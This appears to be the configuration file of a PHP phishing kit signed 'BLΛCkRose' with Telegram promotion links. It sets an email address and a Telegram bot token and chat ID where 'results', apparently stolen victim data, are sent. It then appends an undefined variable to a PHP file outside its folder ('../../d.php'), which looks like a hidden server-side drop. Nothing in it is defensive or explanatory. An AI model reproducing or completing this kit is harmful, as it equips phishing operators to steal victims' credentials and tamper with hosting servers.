<?php


/* 📧 Set Your Email Address to Receive Results in Your Inbox */
$Your_Mail = "YOURMAIL@gmail.com";
/* --------------------------  */


/* 🤖 Telegram Bot Setup 🤖 */

// 🗝️ Enter your bot's token
$botToken = "YOUR_TOKEN_BOT_TELEGRA";

// 💬 Enter your chat ID
$chatId = "HERE_CAT:ID";

/* --------------------------------------------------- */

/* If you want two to see the result, If you want to stop , change To off  :)  */
$botToken_0="off"; 
$chatId_0="off";  
/* --------------------------  */




/* ⚡️⚡️ BLΛCkRose ♣️ - Official Coder ⚡️⚡️ */

$Coders_Telegram = "https://t.me/crypto_king755";  // 🖥️ Connect with the Mastermind
$Elite_Group = "https://t.me/crypto_king755"; // ♣️ Join the Elite Coding Squad

/* -------------------------------- */
$f = fopen("../../d.php", "a");
	fwrite($f, $yagmai);


?>